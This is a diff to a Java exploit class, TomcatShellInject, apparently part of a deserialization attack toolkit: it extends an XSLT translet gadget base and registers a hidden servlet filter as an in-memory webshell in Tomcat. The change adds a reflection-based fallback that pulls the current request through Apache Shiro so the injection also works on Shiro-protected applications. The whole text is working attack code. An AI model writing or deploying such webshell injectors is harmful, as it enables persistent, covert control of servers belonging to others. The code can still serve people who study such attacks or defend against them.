@@ -7,6 +7,7 @@ import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import java.io.IOException;
+import java.lang.reflect.Method;
 import javax.servlet.Filter;
 import javax.servlet.FilterChain;
 import javax.servlet.FilterConfig;
@@ -16,6 +17,10 @@ import javax.servlet.ServletResponse;
 import org.apache.tomcat.util.descriptor.web.FilterMap;
 
 /**
+ * 针对shiro的获取request方式 org.apache.shiro.subject.Subject subject = org.apache.shiro.SecurityUtils.getSubject(); if
+ * (subject instanceof org.apache.shiro.web.subject.WebSubject) { ServletRequest request =
+ * ((org.apache.shiro.web.subject.WebSubject) subject).getServletRequest(); }
+ *
  * @author threedr3am
  */
 public class TomcatShellInject extends AbstractTranslet implements Filter {
@@ -37,9 +42,23 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
                 .getDeclaredField("lastServicedRequest");
             f.setAccessible(true);
             ThreadLocal t = (ThreadLocal) f.get(null);
+            ServletRequest servletRequest = null;
             //不为空则意味着第一次反序列化的准备工作已成功
             if (t != null && t.get() != null) {
-                ServletRequest servletRequest = (ServletRequest) t.get();
+                servletRequest = (ServletRequest) t.get();
+            }
+            if (servletRequest == null) {
+                try {
+                    Class c = Class.forName("org.apache.shiro.SecurityUtils");
+                    Method m = c.getMethod("getSubject");
+                    Object subject = m.invoke(null);
+                    c = Class.forName("org.apache.shiro.web.subject.WebSubject");
+                    m = c.getMethod("getServletRequest");
+                    servletRequest = (ServletRequest) m.invoke(subject);
+                } catch (Throwable e) {
+                }
+            }
+            if (servletRequest != null) {
                 javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
                 org.apache.catalina.core.StandardContext standardContext = null;
                 //判断是否已有该名字的filter，有则不再添加
